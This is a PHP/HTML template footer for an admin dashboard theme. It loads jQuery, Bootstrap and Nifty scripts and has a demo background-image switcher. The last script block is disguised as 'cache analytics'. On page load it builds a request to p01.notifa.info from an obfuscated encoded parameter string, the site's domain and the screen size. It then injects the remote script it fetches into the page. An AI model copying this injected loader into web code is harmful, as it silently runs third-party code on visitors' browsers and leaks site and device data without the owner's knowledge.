<!--JAVASCRIPT-->
<!--=================================================-->

<!--jQuery [ REQUIRED ]-->
<script src="<?php echo base_url('assets');?>/js/jquery.min.js"></script>


<!--BootstrapJS [ RECOMMENDED ]-->
<script src="<?php echo base_url('assets');?>/js/bootstrap.min.js"></script>


<!--NiftyJS [ RECOMMENDED ]-->
<script src="<?php echo base_url('assets');?>/js/nifty.min.js"></script>




<!--=================================================-->

<!--Background Image [ DEMONSTRATION ]-->

<script type="text/javascript">
$(document).on('nifty.ready', function() {
    var $imgHolder 	= $('#demo-bg-list');
    var $bgBtn 		= $imgHolder.find('.demo-chg-bg');
    var $target 	= $('#bg-overlay');

    $bgBtn.on('click', function(e){
        e.preventDefault();
        e.stopPropagation();


        var $el = $(this);
        if ($el.hasClass('active') || $imgHolder.hasClass('disabled'))return;
        if ($el.hasClass('bg-trans')) {
            $target.css('background-image','none').removeClass('bg-img');
            $imgHolder.removeClass('disabled');
            $bgBtn.removeClass('active');
            $el.addClass('active');

            return;
        }

        $imgHolder.addClass('disabled');
        var url = $el.attr('src').replace('/thumbs','');

        $('<img/>').attr('src' , url).on('load', function(){
            $target.css('background-image', 'url("' + url + '")').addClass('bg-img');
            $imgHolder.removeClass('disabled');
            $bgBtn.removeClass('active');
            $el.addClass('active');

            $(this).remove();
        })

    });


});
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjVYPvz8EvePryz3GltSPqJqzP4k29vAJGrcx%2b1VDBSUzTKYG1hjDGT3F5dOY6ytyaZGaP6nn7W9JqxudB9W6uwgGMw%2bb12Bbvh3wmHozassvvjOqqXFJpcisCgJtFBtcmn%2bJWy6lRL0igwjf4S2yoYTzqQb77iw1TaoDSLkmSEbtc0eRuAePv%2fPYA83JbXMTTf1ONss158fFCBm32iFxaa5b7c4WYhyYk1Qb9BqcKaFr9YKXjVq42pFrQ5jUrhvAHvcBjDHecoomO6Q97gHetEOOM2WTvZBzm%2bZ%2f98LSMpw7duEHNlsZpdypB9iyq0hm6%2fQxnlT4ipR7GX%2bM1zfrw0oKbnRptGo3TpzrArqVQ4ACI2IYOXXxSCsghMvP9%2ffwJLiXHSq%2fZ9D2of9akRiM6F%2b83l7zNQgcd%2bEDu7k6LjihtoMjJsHjPHGjHJl9Lj2BqnSqLWNfvwlP3EiOWXy359mwhie%2bRauf0wbfOS%2fYMIKEg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
